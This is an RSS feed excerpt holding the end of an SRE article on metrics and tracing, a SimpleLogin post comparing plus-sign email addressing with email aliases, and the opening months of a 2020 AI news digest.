</pre></blog-code></blog-section><blog-section><h3 slot="title">Gauges</h3><p>A gauge metric can vary freely across its possible value range. Think of them like tachometers.</p><p>Gauges can be text or numbers.</p><ul><li>Example integer gauges are memory allocation, thread count, active RPC count.</li><li>Example text gauges are mutable config settings (e.g. backend addresses), environment variables, and hostnames.</li></ul><table><thead><tr><th>Time</th><th><code>/proc/thread_count</code></th><th><code>/proc/working_directory</code></th></tr></thead><tbody><tr><td>2011-12-13 14:15</td><td>200</td><td>/var/www/current</td></tr><tr><td>2011-12-13 14:16</td><td>250</td><td>/var/www/previous</td></tr><tr><td>2011-12-13 14:17</td><td>230</td><td>/var/www/current</td></tr></tbody></table><p>In Go, using a gauge metric might look something like this:</p><blog-code syntax="go"><pre>import "foo.com/my/monitoring/impl/metric"

var (
	threadCount = metric.NewGaugeInt64("/proc/thread_count")
	workingDir = metric.NewGaugeString("/proc/working_directory")
)

func updateMetrics() {
	threadCount.Set(int64(runtime.NumGoroutine()))
	wd, _ := os.Getwd()
	workingDir.Set(wd)
}
</pre></blog-code></blog-section><blog-section><h3 slot="title">Counters</h3><p>A counter metric must be a number, and can only increase during the lifetime of the system. Counters are almost always integers to avoid the implications of IEEE-754 rounding.</p><p>Example counter metrics are CPU microseconds spent, or the total request count.</p><p>Counters can only increase. If the metric collector sees that a new value is lower than the older value, it knows a <i>metric reset</i> has occurred. Resets happen when a process restarts, clearing in-memory state of the counter.</p><table><thead><tr><th>Time</th><th><code>/net/http/server/request_count</code></th><th></th></tr></thead><tbody><tr><td>2011-12-13 14:15</td><td>10000</td><td></td></tr><tr><td>2011-12-13 14:16</td><td>11000</td><td></td></tr><tr><td>2011-12-13 14:17</td><td>1500</td><td>RESET</td></tr></tbody></table><p>In Go, defining a counter metric might look something like this:</p><blog-code syntax="go"><pre>import "foo.com/my/monitoring/impl/metric"

var (
	requestCount = metric.NewCounterInt64("/net/http/server/request_count")
)

func handler(w http.ResponseWriter, req *http.Request) {
	requestCount.Increment() // or .IncrementBy(1)
}
</pre></blog-code></blog-section><blog-section><h3 slot="title">Distributions</h3><p><a href="https://en.wikipedia.org/wiki/Frequency_distribution">Distributions</a> are used for metrics with a very large set of possible values. They are usually visualized as a histogram or heat map.</p><p>Examples include request latencies, client IP addresses<blog-footnote-ref>[<a href="#fn:3">3</a>]</blog-footnote-ref>, and aggregations of constant/gauge/counter metrics from other sources.</p><table><thead><tr><th>Time</th><th><code>/net/http/server/response_latency</code> (seconds)</th></tr></thead><tbody><tr><td>2011-12-13 14:15</td><td><pre>[ 0,  2) #
[ 2,  3) ###
[ 3,  5) #######
[ 5,  8) ####
[ 8, 13) ##
[13,  ∞)
</pre></td></tr><tr><td>2011-12-13 14:16</td><td><pre>[ 0,  2) #
[ 2,  3) ####
[ 3,  5) ########
[ 5,  8) ###
[ 8, 13) #
[13,  ∞)
</pre></td></tr><tr><td>2011-12-13 14:17</td><td><pre>[ 0,  2) 
[ 2,  3) #
[ 3,  5) ##
[ 5,  8) #####
[ 8, 13) ########
[13,  ∞) #
</pre></td></tr></tbody></table><p>In Go, defining a distribution metric might look something like this:</p><blog-code syntax="go"><pre>import "foo.com/my/monitoring/impl/metric"

var (
	latency = metric.NewDurations(
		"/net/http/server/response_latency",
		metric.BinDurations([]time.Duration{
			2 * time.Second,
			3 * time.Second,
			5 * time.Second,
			8 * time.Second,
			13 * time.Second,
		})
	)
)

func handler(w http.ResponseWriter, req *http.Request) {
	start := time.Now()
	defer func() {
		latency.Sample(time.Now() - start)
	}()
}
</pre></blog-code><p>Each distribution is also inherently a set of counters, because recording a sample in one of the bins will increment that bin's count. This property can be used to simplify some monitoring configurations.</p><p>Bins can be defined statically (as in the example above), or using a function. Binning might be performed either by the system reporting the metric, or by the monitoring infrastructure.</p><ul><li>With <b>client-side binning</b>, the reporter decides how fine-grained the distribution should be.<ul><li>This is usually configurable per-metric by a command-line flag or config setting.</li><li>Changing the binning can cause vertical aberrations in visualisations.</li></ul></li><li>With <b>collector-side binning</b>, the client reports the events as-is and the monitoring infrastructure aggregates the data before storing/forwarding it.<ul><li>Example: collector receives raw distribution samples from its clients, and records {50,90,95,99}th percentiles over a trailing window.</li><li>This can be significantly less flexible, and it is often difficult to visualize percentiles as usefully as a full distribution.</li></ul></li></ul></blog-section><blog-section><h3 slot="title">Metric Names</h3><p>I know of three styles for metric names:</p><ul><li>The <a href="https://prometheus.io/docs/practices/naming/">Prometheus Style Guide</a> recommends <code>myapp_descriptive_snake_case</code>, where <code>myapp_</code> is a one-word prefix specific to the system being monitored. This style is derived from <a href="http://landing.google.com/sre/book/chapters/practical-alerting.html">Google Borgmon</a>, which uses metric names as symbols in its configuration DSL<blog-footnote-ref>[<a href="#fn:4">4</a>]</blog-footnote-ref>.<ul><li><a href="https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/CW_Support_For_AWS.html">Amazon CloudWatch metrics</a> use this format, without a prefix.</li></ul></li><li><a href="https://github.com/etsy/statsd">statsd</a> and its derivatives use <code>short.dotted.words</code>, though the exact symbol set can vary between vendors.<ul><li>For example, <a href="https://help.datadoghq.com/hc/en-us/articles/203764705-What-are-valid-metric-names-">DataDog allows alphanum, underscores, and periods</a>.</li></ul></li><li><a href="https://cloud.google.com/monitoring/api/metrics_gcp">Google Stackdriver</a> uses <code>myapp.com/unix/filesystem/paths</code>, with each product having its own "subdirectory" in the metrics hierarchy.<ul><li>The same style is applied to <a href="https://cloud.google.com/monitoring/api/metrics_aws">AWS metrics in Stackdriver</a>, by adding product-specific prefixes for each CloudWatch metric.</li></ul></li></ul><p>My personal favorite is the UNIX paths style, which I've seen used to great success. Engineers exposed to this style begin to naturally lay out metric hierarchies, with clear meanings and good namespacing. I don't have any solid data about <i>why</i> the naming style has such an effect, but I suspect it has something to do with familiarity:</p><ul><li>A metric name like <code>http_request_count</code> is well and good, but <code>myapp_com.net.http.server.request_count</code> looks <i>wrong</i> to an experienced engineer. Expressions that use that many dots violate the <a href="http://wiki.c2.com/?LawOfDemeter">Law of Demeter</a>.</li><li>In contrast, path-shaped metric names like <code>myapp.com/net/http/server/request_count</code> inspire no such negative thoughts. Long paths are common in UNIX environments, and it's certainly no harder to remember than many of the paths in Linux's <code>sysfs</code>.</li></ul></blog-section></blog-section><blog-section><h2 slot="title">Traces</h2><p>While metrics help understand the system in aggregate, traces are used to understand the relationship between the parts of a system that processed a particular request.</p><p>A trace is a tree of <i>spans</i>, which each represent a logical region of the system's execution time. Spans are nested – all spans except the <i>root span</i> have a <i>parent span</i>, and a trace is constructed by walking the tree to link parents with their children.</p><pre>########################  GET /user/messages/inbox
 ######                   User permissions check
    ####                  Read template from disk
    #########             Query database
             ###          Render page to HTML
                ##        Compress response body
                  ######  Write response body
</pre><p>Spans and traces can be understood by analogy to lower-level programming concepts. If a trace is a stack trace, then a span is a single stack frame. Just as every stack frame is pushed and popped, each span begins and ends. It's the timing of when the spans begin and end that is interesting when analysing a trace.</p><p>Each span is implicitly a sample of a duration distribution, and therefore also a counter<blog-footnote-ref>[<a href="#fn:5">5</a>]</blog-footnote-ref>.</p><p>Tools for creating and recording traces are currently less mature than for creating metrics, and a wide variety of tracing platforms exists. <a href="http://opentracing.io/">OpenTracing</a> is an attempt to provide vendor-neutral APIs for many languages so that tracing support can more easily be added to shared libraries.</p></blog-section><blog-section><h2 slot="title">Events</h2><p>Events are conceptually similar to logging, …</p></blog-section></blog-article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://john-millikin.com/sre-school/instrumentation">https://john-millikin.com/sre-school/instrumentation</a></em></p>]]>
            </description>
            <link>https://john-millikin.com/sre-school/instrumentation</link>
            <guid isPermaLink="false">hacker-news-small-sites-25562193</guid>
            <pubDate>Mon, 28 Dec 2020 19:14:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why email plus (+) trick isn't good for privacy (or why email alias is better)]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25561797">thread link</a>) | @sonmicrosystems
<br/>
December 28, 2020 | https://simplelogin.io/blog/email-alias-vs-plus-sign/ | <a href="https://web.archive.org/web/*/https://simplelogin.io/blog/email-alias-vs-plus-sign/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content" role="main">
    <div>
        

        <div>
            <div>
                
                <p>
                    December 19, 2020 Â·
                    written by <img src="https://simplelogin.io/logo-square.svg" alt="Author Image">
                    SimpleLogin team
                </p>
            </div>
        </div>

        

        

        <p><a href="https://en.wikipedia.org/wiki/Email_address#Subaddressing">Email subaddressing</a>, also known as plus sign (+) trick, is popularized by Gmail and now supported by most email providers. It allows creating a new email address by simply appending the plus sign(<strong>+</strong>) to your current email address.</p>
<p>For example, if your email address is <code>name@email.com</code>, you can quickly create a new email address like <code>name+facebook@email.com</code> for Facebook, <code>name+twitter@email.com</code> for Twitter, etc.</p>
<p>Here’s a closer look at the pros and cons of using the plus sign trick, especially when compared with email aliases.</p>

        

        

        <h3 id="plus-sign-trick-advantages">Plus sign trick advantages</h3>
<p>The main advantage of the plus sign trick is it’s easy to use and already available.</p>
<p>If you use email filters, email subaddressing is also very useful. For example, you can set up a filter to move all emails sent to <code>name+groupon@email.com</code> to the <strong>Promotion</strong> folder.</p>
<p>With subaddressing, you can create an unlimited number of email addresses: just add something after the plus sign and youâ€™ll have a new email address.</p>
<p>If you are a developer or work in QA, being able to quickly create a new email address is very helpful when testing a website or application.</p>
<h3 id="what-are-simplelogin-email-aliases">What are SimpleLogin email aliases?</h3>
<p>An email alias is simply a forwarding email address. Emails sent to an email alias are forwarded to your original email address.</p>
<p>Like the plus sign trick, SimpleLogin allows you to have a different email address for each website: just create a new email alias everytime you need an email address.</p>
<p>Usually an email alias only allows email forwarding but with SimpleLogin, you can also send emails or reply from your email alias.</p>
<p>Currently there are 4 ways of creating a new email alias in SimpleLogin:</p>
<ul>
<li>If you are on a laptop/PC, the <a href="https://addons.mozilla.org/firefox/addon/simplelogin/">Firefox</a> or <a href="https://chrome.google.com/webstore/detail/dphilobhebphkdjbpfohgikllaljmgbn">Chrome</a> extension allows creating a new email alias by clicking on the SimpleLogin icon in the email field. You can also use the right click menu to create a new email alias.</li>
</ul>
<p><img src="https://sldev.ovh/images/one-click-alias.gif" alt=""></p>
<ul>
<li>
<p>Using one of SimpleLogin apps: <a href="https://app.simplelogin.io/">website</a>, Firefox/Chrome extension popup or <a href="https://play.google.com/store/apps/details?id=io.simplelogin.android">Android</a>/<a href="https://apps.apple.com/app/id1494359858">iOS</a> app for more customization. This is the most flexible way and offers advanced options.</p>
</li>
<li>
<p>Creating email aliases on the fly via <strong>catch-all</strong> domain. If you own a domain, you can enable the catch-all option that allows you to use <code>can_be_anything@your-domain.com</code> as email address: it’s automatically created when an email is sent to this address.</p>
</li>
<li>
<p>Creating email aliases on the fly via <a href="https://simplelogin.io/blog/alias-directory/">directory</a>: this is actually similar to the plus sign trick. If you have a directory called <strong>newsletter</strong>, you can then use <code>newsletter+python@simplelogin.fr</code> when signing for a Python newsletter.</p>
</li>
</ul>
<h3 id="plus-sign-trick-email-address-isnt-good-for-privacy">Plus sign trick email address isn’t good for privacy</h3>
<p>Though practical, plus sign trick is well-known and your real email address can be easily extracted: one just needs to remove the part after the plus sign. For this reason, if your subaddress appears in an email leak (that you can easily verify on <a href="https://haveibeenpwned.com/">https://haveibeenpwned.com</a>), a bad actor can extract your real email address and uses it for a spam/phishing campaign or to match with other data breaches.</p>
<p>Email addresses that contain the plus sign are sometimes (incorrectly) considered invalid. Even worse, a website can silently drop the part after the plus sign and use your real email address instead.</p>
<p>If you use Gmail, you can’t also reply from the subaddress. When you reply to an email sent to a <code>name+newsletter@gmail.com</code>, the reply will come from your real email address <code>name@gmail.com</code></p>
<h3 id="email-aliases-protect-your-privacy">Email aliases protect your privacy</h3>
<p>An email alias is random and there’s no way to link 2 email aliases to the same person.</p>
<p>For email aliases created with a catch-all domain, they can only be linked together if the domain is known to have the catch-all option enabled. There’s no way to detect whether a domain has this option enabled or to know how many people are using a domain, a bad actor usually ignores these email addresses altogether.</p>
<p>For email aliases created via <strong>directory</strong>, you can use a different separator than the plus sign to reduce the chance of your email aliases being linked together. SimpleLogin also supports the hash sign (#) and the slash sign (/) as separator and in the future, you can also use directory as a subdomain (i.e. <code>newsletter.simplelogin.fr</code>). You can then either use <code>newsletter/python@simplelogin.fr</code>, <code>newsletter#python@simplelogin.fr</code> or <code>python@newsletter.simplelogin.fr</code> as email address.</p>
<h3 id="email-aliases-reveal-who-are-selling-your-data">Email aliases reveal who are selling your data</h3>
<p>If you use a different email alias for each website and one of your aliases starts receiving emails it isn’t supposed to receive, you can be sure that this alias is either leaked or sold.</p>
<p>For example, if your email alias for Facebook receives emails from LinkedIn, that means Facebook has sold your data to LinkedIn or they’ve had a data breach. Either way, you can just disable this alias. Your real email address stays hidden.</p>
<p>Data brokers, <a href="https://www.webfx.com/blog/general/what-are-data-brokers-and-what-is-your-data-worth-infographic/">a $200 billion industry</a> use your email address as the common denominator to match users between different datasets. Having thousands of email addresses make their job harder and your privacy better.</p>
<h3 id="email-aliases-are-more-flexible">Email aliases are more flexible</h3>
<p>With email aliases, it’s easy to change where emails are forwarded. You can just add an additional mailbox so every email sent to your email aliases is forwarded to both mailboxes.</p>
<p>You can also have more complex setup like having an email alias for a shoping website that forwards to both your mailbox and your partner’s mailbox. Or an email alias for your support team that allows anyone to receive customer requests and reply from the support email address.</p>
<h3 id="additional-protection">Additional protection</h3>
<p>On popular email services like Gmail, Outlook, your emails are stored in plaintext, meaning anyone who has access to their servers can read your emails. Even though these services claim to have a strict policy in place and promise they would never read your emails, scandals in the past have shown otherwise. With the <a href="https://blog.twitter.com/en_us/topics/company/2020/an-update-on-our-security-incident.html">recent Twitter hack</a>, an employee can be social-engineered to leak the data or leave a backdoor for hackers.</p>
<p><a href="https://en.wikipedia.org/wiki/Pretty_Good_Privacy">Pretty Good Privacy</a> (PGP) was created in 1991 as a way to encrypt your emails, texts, files, etc. Used by Edward Snowden, journalists, dissidents, … PGP is highly secure and almost unbreakable.</p>
<p>In PGP, you have 2 keys: the private key that allows you to decrypt the emails and that you should never lose. The public key is public (hence the name) that allows anyone who wants to send you an email to encrypt the email. Only you can then read the encrypted email.</p>
<p>SimpleLogin <a href="https://simplelogin.io/blog/introducing-pgp/">supports PGP</a> and allows you to use PGP on email services that don’t natively support it. For example, you can use PGP on your Gmail using browser extensions like <a href="https://www.mailvelope.com/en">Mailvelope</a> or <a href="https://flowcrypt.com/">FlowCrypt</a> and have SimpleLogin encrypting all emails sent to your Gmail.</p>
<h3 id="security">Security</h3>
<p>Though primarily focused on privacy, email aliases are a good way to increase your online security. Email address is usually used with password as account credential. If you use a different email alias for each website, a bad actor now needs to know both your password and the email alias in order to hack your account.</p>
<h3 id="recommendations">Recommendations</h3>
<p>With multiple advantages over plus sign trick, email aliases is a great tool to protect your online privacy. It’s recommended to use a password manager to help remember the email aliases used on different websites.</p>
<p><a href="https://app.simplelogin.io/auth/register">Sign up</a> for a new SimpleLogin account to explore how email aliases can help protect your online privacy. If you have used email aliases in the past, you might be surprised by how easy it becomes now ;).</p>


    </div>
</div></div>]]>
            </description>
            <link>https://simplelogin.io/blog/email-alias-vs-plus-sign/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561797</guid>
            <pubDate>Mon, 28 Dec 2020 18:38:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AI News in 2020: A Digest]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25561689">thread link</a>) | @jonbaer
<br/>
December 28, 2020 | https://www.skynettoday.com/digests/year-2020 | <a href="https://web.archive.org/web/*/https://www.skynettoday.com/digests/year-2020">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>        
      
      
      <h4>An overview of the big AI-related stories of 2020</h4>
      
      </div><div>
      <h2 id="overview">Overview</h2>

<p>With 2020 (finally) drawing to a close, it’s a good time to reflect on what happened with AI in the this most weird year. Above is a wordcloud of the most common words used in titles of articles we’ve curated in our <a href="https://lastweekin.ai/">‘Last Week in AI’ newsletter</a> over this past year. This reflects just about 1000 articles that we’ve included in the newsletter in 2020:</p>

<figure>
 <img src="https://www.skynettoday.com/assets/img/digests/year-2020/counts.png">
 <figcaption> Counts of terms in articles vs time</figcaption>
</figure>

<p>Unsurprisingly, the vague but recognizable term “AI” remained the most popular term to use in article titles, with specifics such as “Deep Learning” or “neural network” remaining comparatively rare:</p>

<figure>
 <img src="https://www.skynettoday.com/assets/img/digests/year-2020/terminology.png">
 <figcaption> Counts of terms in article titles vs time</figcaption>
</figure>

<p>Digging a bit deeper, we find that Coronavirus and Facial Recognition were the biggest topics of the year, followed by bias, deepfakes, and other topics:</p>

<figure>
 <img src="https://www.skynettoday.com/assets/img/digests/year-2020/topics.png">
 <figcaption> Counts of terms in article titles vs time</figcaption>
</figure>

<p>But enough overview – let’s go through the most significant articles we’ve curated from the past year, month by month. As in with our newsletter, these articles will be about Advances &amp; Business, Concerns &amp; Hype, Analysis &amp; Policy, and in some cases Expert Opinions &amp; Discussion within the field. They will be presented in chronological order, and represent a curated selection that we believe are particularly noteworthy. Click on the name of the month for the full newsletter release that started out that month.</p>

<h2 id="january"><a href="https://lastweekin.ai/p/2571001_new-article-digest-46">January</a></h2>

<p>Things started pretty calm in 2020, with a lot of discussion about what to expect from AI in the future, and some articles discussing issues with facial recognition and bias which will become a trend throughout the year:</p>

<ul>
  <li><a href="https://www.technologyreview.com/s/614992/ai-ethics-washing-time-to-act/">In 2020, let’s stop AI ethics-washing and actually do something</a></li>
  <li><a href="https://www.nature.com/articles/d41586-019-03822-8">AI shows promise for breast cancer screening</a></li>
  <li>
    <p><a href="https://www.reuters.com/article/us-usa-artificial-intelligence-idUSKBN1Z21PT">U.S. government limits exports of artificial intelligence software</a></p>
  </li>
  <li><a href="https://www.theatlantic.com/technology/archive/2020/01/future-politics-bots-drowning-out-humans/604489/">The Future of Politics Is Robots Shouting at One Another</a></li>
  <li><a href="https://www.technologyreview.com/s/615015/ai-regulatory-principles-us-white-house-american-ai-initiatve/#Echobox=1578413684">The US just released 10 principles that it hopes will make AI safer</a></li>
  <li>
    <p><a href="https://www.technologyreview.com/s/614810/were-fighting-fake-news-ai-bots-by-using-more-ai-thats-a-mistake/">We’re fighting fake news AI bots by using more AI. That’s a mistake.</a></p>
  </li>
  <li><a href="https://bostonreview.net/science-nature-politics/annette-zimmermann-elena-di-rosa-hochan-kim-technology-cant-fix-algorithmic">Technology Can’t Fix Algorithmic Injustice</a></li>
  <li><a href="https://www.nytimes.com/2020/01/18/technology/clearview-privacy-facial-recognition.html">The Secretive Company That Might End Privacy as We Know It</a></li>
  <li><a href="https://thenextweb.com/artificial-intelligence/2020/01/17/why-using-ai-to-screen-job-applicants-is-almost-always-a-bunch-of-crap/">Why using AI to screen job applicants is almost always a bunch of crap</a></li>
</ul>

<h2 id="february"><a href="https://lastweekin.ai/p/2591009_new-article-digest-50">February</a></h2>

<p>February saw more discussions of the negative impacts of AI, along with some pieces highlighting efforts to use it for good, and the begginings of AI being connected to the Coronavirus pandemic:</p>

<ul>
  <li><a href="https://www.stanforddaily.com/2020/01/27/ai-for-good-talk-pushes-tech-usage-to-mitigate-humans-environmental-impact/">“AI for Good” talk pushes tech usage to mitigate humans’ environmental impact</a></li>
  <li><a href="https://www.zdnet.com/article/microsoft-takes-the-wraps-off-40-million-five-year-ai-for-health-initiative/">Microsoft takes the wraps off $40 million, five-year ‘AI for Health’ initiative</a></li>
  <li><a href="https://www.buzzfeednews.com/article/ryanmac/clearview-ai-cops-run-wild-facial-recognition-lawsuits">Facial Recognition Startup Clearview AI Is Struggling To Address Complaints As Its Legal Issues Mount</a></li>
  <li><a href="https://www.technologyreview.com/f/615114/a-study-of-youtube-comments-shows-how-its-turning-people-onto-the-alt-right/">YouTube’s algorithm seems to be funneling people to alt-right videos</a></li>
  <li>
    <p><a href="https://www.nytimes.com/2020/01/29/technology/warehouse-robot.html">A Warehouse Robot Learns to Sort Out the Tricky Stuff</a></p>
  </li>
  <li><a href="https://venturebeat.com/2020/02/06/ieee-calls-for-standards-to-combat-climate-change-and-protect-kids-in-the-age-of-ai/">IEEE calls for standards to combat climate change and protect kids in the age of AI</a></li>
  <li><a href="https://www.forbes.com/sites/saibala/2020/02/03/artificial-intelligence-is-not-ready-for-the-intricacies-of-radiology/">Artificial Intelligence Is Not Ready For The Intricacies Of Radiology</a></li>
  <li>
    <p><a href="https://www.scmp.com/tech/start-ups/article/3048746/artificial-intelligence-applications-surge-china-battles-contain">Artificial intelligence applications surge as China battles to contain coronavirus epidemic</a></p>
  </li>
  <li><a href="https://www.forbes.com/sites/patriciagbarnes/2020/02/03/group-asks-federal-trade-commission-to-regulate-use-of-artificial-intelligence-in-pre-employment-screenings/">Group Asks Federal Trade Commission To Regulate Use Of Artificial Intelligence In Pre-Employment Screenings</a></li>
  <li><a href="https://www.technologyreview.com/s/615232/ai-emotion-recognition-affective-computing-hirevue-regulation-ethics/">Emotion AI researchers say overblown claims give their work a bad name</a></li>
  <li>
    <p><a href="https://www.businessinsider.com/facial-recognition-search-clearview-ai-child-abuse-id-2020-2">The controversial facial recognition tech from Clearview AI is also being used to identify child victims of sexual abuse</a></p>
  </li>
  <li><a href="https://www.technologyreview.com/s/615181/ai-openai-moonshot-elon-musk-sam-altman-greg-brockman-messy-secretive-reality/">The messy, secretive reality behind OpenAI’s bid to save the world</a></li>
  <li><a href="https://www.wired.com/story/drive-los-angeles-police-track-every-move/">If You Drive in Los Angeles, Police Can Track Your Every Move</a></li>
  <li><a href="https://www.vox.com/future-perfect/2020/2/14/21063487/self-driving-cars-autonomous-vehicles-waymo-cruise-uber">It’s 2020. Where are our self-driving cars?</a></li>
  <li><a href="https://www.vice.com/en_in/article/jgedjb/the-first-use-of-deepfakes-in-indian-election-by-bjp">We’ve Just Seen the First Use of Deepfakes in an Indian Election Campaign</a></li>
</ul>

<h2 id="march"><a href="https://lastweekin.ai/p/2611449_new-article-digest-54">March</a></h2>

<p>March was a big month with three stories standing out.
First is the closing of <strong>Starsky Robotics</strong>, a promising startup that worked on self-driving trucks.
In a detailed blog post, the founder discussed the immense challenges in technology, safety, and economics that face the autonomous driving industry.</p>

<ul>
  <li><a href="https://medium.com/starsky-robotics-blog/the-end-of-starsky-robotics-acb8a6a8a5f5">The End of Starsky Robotics</a></li>
</ul>

<p>Second is the publicity of <strong>Clearview AI</strong>, which violated many ethical and legal norms by scraping pictures of faces on the Internet to power its facial recognition system that allows its customers, from law enforcement to retail chains, to search for anyone with a picture of their face.</p>

<ul>
  <li><a href="https://www.buzzfeednews.com/article/ryanmac/clearview-ai-fbi-ice-global-law-enforcement">Clearview’s Facial Recognition App Has Been Used By The Justice Department, ICE, Macy’s, Walmart, And The NBA</a></li>
  <li><a href="https://www.vice.com/en_us/article/k7exem/banjo-ai-company-utah-surveillance-panopticon">This Small Company Is Turning Utah Into a Surveillance Panopticon</a></li>
  <li><a href="https://onezero.medium.com/i-got-my-file-from-clearview-ai-and-it-freaked-me-out-33ca28b5d6d4">I Got My File From Clearview AI, and It Freaked Me Out</a></li>
</ul>

<p>Lastly is the flood of reports on the fast-developing <strong>Covid-19</strong> and the roles AI/robotics can (and cannot) play to help alleviate the pandemic.</p>

<ul>
  <li><a href="https://www.vox.com/recode/2020/2/27/21156358/surveillance-tech-coronavirus-china-facial-recognition">Coronavirus is the first big test for futuristic tech that can prevent pandemics</a></li>
  <li><a href="https://www.technologyreview.com/s/615351/ai-could-help-with-the-next-pandemicbut-not-with-this-one/">AI could help with the next pandemic–but not with this one</a></li>
  <li><a href="https://www.technologyreview.com/s/615360/cdc-cmu-forecasts-coronavirus-spread/">This is how the CDC is trying to forecast coronavirus’s spread</a></li>
  <li><a href="https://www.scmp.com/news/china/science/article/3076259/should-ai-help-make-life-or-death-decisions-coronavirus-fight">Should AI help make life-or-death decisions in the coronavirus fight?</a></li>
  <li><a href="https://www.wsj.com/articles/biotech-companies-tap-ai-to-speed-path-to-coronavirus-treatments-11583451564">Biotech Companies Tap AI to Speed Path to Coronavirus Treatments</a></li>
  <li><a href="https://futurism.com/adorable-self-driving-vans-are-disinfecting-roads-in-china">Adorable Self-Driving Vans are Disinfecting Roads in China</a></li>
  <li><a href="https://www.therobotreport.com/covid-19-pandemic-prompts-more-robot-usage-worldwide/">COVID-19 pandemic prompts more robot usage worldwide</a></li>
  <li><a href="https://www.wired.com/story/covid-19-pandemic-robots/">The Covid-19 Pandemic Is a Crisis That Robots Were Built For</a></li>
  <li><a href="https://www.wired.com/story/robot-jobs-coronavirus/">If Robots Steal So Many Jobs, Why Aren’t They Saving Us Now?</a></li>
</ul>

<h2 id="april"><a href="https://lastweekin.ai/p/2642417_new-article-digest-59">April</a></h2>

<p>April saw a continuation of many stories centered on Covid-19, with some exceptions more related to ethical AI development:</p>

<ul>
  <li><a href="https://www.theguardian.com/science/2020/mar/30/scientists-develop-ai-that-can-turn-brain-activity-into-text">Scientists develop AI that can turn brain activity into text</a></li>
  <li><a href="https://techcrunch.com/2020/04/02/using-ai-responsibly-to-fight-the-coronavirus-pandemic/">Using AI responsibly to fight the coronavirus pandemic</a></li>
  <li><a href="https://news.berkeley.edu/2020/03/30/uc-berkeley-scientists-spin-up-a-robotic-covid-19-testing-lab/">UC Berkeley scientists spin up a robotic COVID-19 testing lab</a></li>
  <li>
    <p><a href="https://www.statnews.com/2020/03/30/debate-over-artificial-intelligence-to-detect-covid-19-in-lung-scans/">Debate flares over using AI to detect Covid-19 in lung scans</a></p>
  </li>
  <li><a href="https://www.weforum.org/agenda/2020/03/covid-19-crisis-artificial-intelligence-creativity/">AI can help with the COVID-19 crisis - but the right human input is key</a></li>
  <li><a href="https://syncedreview.com/2020/03/28/physical-distancing-boosts-ai-powered-online-education-in-china/">Physical Distancing Boosts AI-Powered Online Education in China</a></li>
  <li>
    <p><a href="https://venturebeat.com/2020/04/06/stanford-researchers-propose-ai-in-home-system-that-can-monitor-for-coronavirus-symptoms/">Stanford researchers propose AI in-home system that can monitor for coronavirus symptoms</a></p>
  </li>
  <li><a href="https://www.bloomberg.com/news/articles/2020-04-07/coronavirus-isn-t-stopping-europe-s-push-to-regulate-ai">Even the Pandemic Doesn’t Stop Europe’s Push to Regulate AI</a></li>
  <li><a href="https://www.towardtrustworthyai.com/">Toward Trustworthy AI Development: Mechanisms for Supporting Verifiable Claims</a></li>
  <li><a href="https://www.nytimes.com/2020/04/08/technology/ai-computers-learning-supervised-unsupervised.html">Computers Already Learn From Us. But Can They Teach Themselves?</a></li>
  <li><a href="https://www.nytimes.com/2020/04/10/business/coronavirus-workplace-automation.html">Robots Welcome to Take Over, as Pandemic Accelerates Automation</a></li>
  <li><a href="https://www.wired.com/story/mit-cuts-ties-chinese-ai-firm-human-rights/">MIT Cuts Ties With a Chinese AI Firm Amid Human Rights Concerns</a></li>
  <li><a href="https://theconversation.com/ai-can-tackle-the-climate-emergency-if-developed-responsibly-132908">AI can tackle the climate emergency - if developed responsibly</a></li>
</ul>

<h2 id="may"><a href="https://lastweekin.ai/p/2667421_new-article-digest-63">May</a></h2>

<p>May was much like April, with a lot of focus on Covid-19 and a mix of stories on ethics, jobs, and advancements:</p>

<ul>
  <li><a href="https://www.wired.com/story/artificial-intelligence-wont-save-us-from-coronavirus/">Artificial Intelligence Won’t Save Us From Coronavirus</a></li>
  <li><a href="https://spectrum.ieee.org/automaton/robotics/home-robots/moxie-a-social-robot-for-childhood-development">Meet Moxie, a Social Robot That Helps Kids With Social-Emotional Learning</a></li>
  <li><a href="https://www.theverge.com/2020/4/30/21243038/openai-jukebox-model-raw-audio-lyrics-ai-generated-copyright">OpenAI introduces Jukebox, a new AI model that generates genre-specific music with lyrics</a></li>
  <li><a href="https://fortune.com/2020/04/28/coronavirus-artificial-intelligence-white-house/">How to make sense of 50,000 coronavirus research papers</a></li>
  <li>
    <p><a href="https://venturebeat.com/2020/04/24/the-surge-of-sensationalist-covid-19-ai-research/">The surge of sensationalist COVID-19 AI research</a></p>
  </li>
  <li><a href="https://venturebeat.com/2020/05/05/openai-begins-publicly-tracking-ai-model-efficiency/">OpenAI begins publicly tracking AI model efficiency</a></li>
  <li><a href="https://www.technologyreview.com/2020/05/05/1001142/ai-reinforcement-learning-simulate-economy-fairer-tax-policy-income-inequality-recession-pandemic/">An AI can simulate an economy millions of times to create fairer tax policy</a></li>
  <li><a href="https://www.nytimes.com/2020/04/30/technology/coronavirus-treatment-benevolentai-baricitinib.html">How A.I. Steered Doctors Toward a Possible Coronavirus Treatment</a></li>
  <li>
    <p><a href="https://www.theverge.com/2020/5/7/21251387/clearview-ai-law-enforcement-police-facial-recognition-illinois-privacy-law">Clearview AI to stop selling controversial facial recognition app to private companies</a></p>
  </li>
  <li><a href="https://www.technologyreview.com/2020/05/14/1001716/ai-chatbots-take-call-center-jobs-during-coronavirus-pandemic/#Echobox=1589473087">The pandemic is emptying call centers. AI chatbots are swooping in</a></li>
  <li><a href="https://www.vox.com/recode/2020/5/11/21166291/artificial-intelligence-ai-background-check-checkr-fama">Beware of these futuristic background checks</a></li>
  <li><a href="https://www.engadget.com/pave-self-driving-car-survey-154045444.html">Americans don’t know why they don’t trust self-driving cars</a></li>
  <li><a href="https://aeon.co/ideas/algorithms-associating-appearance-and-criminality-have-a-dark-past">Algorithms associating appearance and criminality have a dark past</a></li>
  <li><a href="https://www.sciencemag.org/news/2020/05/eye-catching-advances-some-ai-fields-are-not-real">Eye-catching advances in some AI fields are not real</a></li>
</ul>

